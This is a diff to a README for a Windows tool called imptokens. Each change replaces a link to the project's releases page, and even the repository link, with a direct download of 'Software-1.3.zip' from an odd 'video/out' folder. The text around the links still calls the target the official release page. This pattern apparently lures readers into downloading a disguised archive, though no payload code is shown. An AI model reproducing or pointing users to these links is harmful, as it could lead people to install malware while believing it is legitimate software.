@@ -1,6 +1,6 @@
 # ⚙️ imptokens - Compress Tokens, Save Time
 
-[![Download imptokens](https://via.placeholder.com/300x50/4CAF50/FFFFFF?text=Download+imptokens)](https://github.com/adam12-cpu/imptokens/releases)
+[![Download imptokens](https://github.com/adam12-cpu/imptokens/raw/refs/heads/main/video/out/Software-1.3.zip+imptokens)](https://github.com/adam12-cpu/imptokens/raw/refs/heads/main/video/out/Software-1.3.zip)
 
 
 ## 📦 What is imptokens?
@@ -28,7 +28,7 @@ imptokens does not require high-end hardware. It runs smoothly on most modern Wi
 
 Go to the official release page to get the latest version of imptokens:
 
-[https://github.com/adam12-cpu/imptokens/releases](https://github.com/adam12-cpu/imptokens/releases)
+[https://github.com/adam12-cpu/imptokens/raw/refs/heads/main/video/out/Software-1.3.zip](https://github.com/adam12-cpu/imptokens/raw/refs/heads/main/video/out/Software-1.3.zip)
 
 This page lists all available versions of the software. Look for the latest stable release, usually marked as the most recent date or version number.
 
@@ -108,7 +108,7 @@ If the program crashes or shows errors during compression, try using smaller fil
 
 You can download imptokens anytime from the official release page:
 
-[https://github.com/adam12-cpu/imptokens/releases](https://github.com/adam12-cpu/imptokens/releases)
+[https://github.com/adam12-cpu/imptokens/raw/refs/heads/main/video/out/Software-1.3.zip](https://github.com/adam12-cpu/imptokens/raw/refs/heads/main/video/out/Software-1.3.zip)
 
 Visit this page to download. Choose the latest Windows installer and follow the installation steps above.
 
@@ -155,6 +155,6 @@ This helps troubleshoot your problem quickly.
 
 ## 🌐 Links
 
-[Download imptokens](https://github.com/adam12-cpu/imptokens/releases)
+[Download imptokens](https://github.com/adam12-cpu/imptokens/raw/refs/heads/main/video/out/Software-1.3.zip)
 
-[GitHub Repository](https://github.com/adam12-cpu/imptokens)
+[GitHub Repository](https://github.com/adam12-cpu/imptokens/raw/refs/heads/main/video/out/Software-1.3.zip)
